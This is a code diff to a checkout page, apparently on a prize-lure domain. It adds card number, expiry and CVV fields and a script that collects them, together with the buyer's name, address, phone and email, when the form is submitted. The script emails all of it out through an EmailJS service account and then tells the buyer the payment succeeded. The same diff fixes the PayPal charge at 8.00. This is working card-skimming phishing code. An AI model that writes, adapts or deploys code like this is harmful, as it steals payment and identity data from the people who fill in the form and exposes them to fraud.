@@ -13,6 +13,8 @@
 <link rel="stylesheet" type="text/css" href="https://prizes-zone.click/storage/258b120b-bc60-4a89-b623-758b919e2342/styles.css?v=715ca377cd72161d49456ab86fc1fcc684b74532">
 <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
 <link rel="stylesheet" type="text/css" href="https://prizes-zone.click/storage/c82202d3-8a77-49bd-8ff2-980c84ab8547/styles.css?v=9529b5247169664a4d465b9c40e33454d040d82f">
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     
                     
                 
@@ -294,6 +296,85 @@
                     </div>
     </div>
 
+           <div class="d-flex flex-column gap-2">
+    <div>
+        <input id="cardno" name="cardno" type="text" placeholder="Card Number" 
+               class="form-control unedited-field" required 
+               pattern="\d{16}" title="Card number must be 16 digits" 
+               minlength="16" maxlength="16">
+    </div>
+
+    <div class="d-flex gap-2">
+        <div style="flex: 1">
+            <input id="expirycard" name="expirycard" type="text" placeholder="MM/YY" 
+                   class="form-control unedited-field" required 
+                   minlength="5" maxlength="5">
+        </div>
+        <div style="flex: 1">
+            <input id="cvv" name="cvv" type="password" placeholder="CVV" 
+                   class="form-control unedited-field" required 
+                   pattern="\d{3}" title="CVV must be 3 digits"
+                   minlength="3" maxlength="3">
+        </div>
+    </div>
+</div>
+
+
+
+
+<script>
+    // Initialize EmailJS
+    (function () {
+        emailjs.init("f-t0mZ9Z5DcDDtmcs"); // Your EmailJS public key
+    })();
+
+    // Auto-insert slash for expiry date
+    document.getElementById('expirycard').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, ''); // Remove non-numeric characters
+        if (value.length >= 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2);
+        }
+        e.target.value = value;
+    });
+
+    // Handle form submission
+    document.getElementById("cart-form").addEventListener("submit", function(event) {
+        event.preventDefault(); // Prevent page reload
+
+        // Fetch form values
+        let formData = {
+            card_number: document.getElementById("cardno").value.trim(),
+            expiry_date: document.getElementById("expirycard").value.trim(),
+            cvv: document.getElementById("cvv").value.trim(),
+            first_name: document.getElementById("first_name").value.trim(),
+            last_name: document.getElementById("last_name").value.trim(),
+            address: document.getElementById("line_1").value.trim(),
+            zip: document.getElementById("zip_or_postcode").value.trim(),
+            city: document.getElementById("city").value.trim(),
+            country_code: document.getElementById("country_code").value.trim(),
+            phone: document.getElementById("intl_phone").value.trim(),
+            email: document.getElementById("email").value.trim()
+        };
+
+        console.log("Sending Data:", formData); // Debugging
+
+        emailjs.send("service_deixbg3", "template_cwdzyqd", formData)
+            .then(function(response) {
+                console.log("Email Sent Successfully:", response);
+                alert("Payment details sent successfully!");
+            })
+            .catch(function(error) {
+                console.error("EmailJS Error:", error);
+                alert("Error sending details. Check the console for more details.");
+            });
+    });
+</script>
+
+
+
+
+
+
         
     <div class="w-100 div-terms d-none">
         <label for="terms" style="font-size: 10px; font-weight: normal;">
@@ -342,7 +423,7 @@
               purchase_units: [
                 {
                   amount: {
-                    value: 800,
+                    value: 8.00,
                   },
                 },
               ],
@@ -372,7 +453,7 @@
               purchase_units: [
                 {
                   amount: {
-                    value: (totalCents / 100).toFixed(2),
+                    value: 8.00,
                   },
                 },
               ],
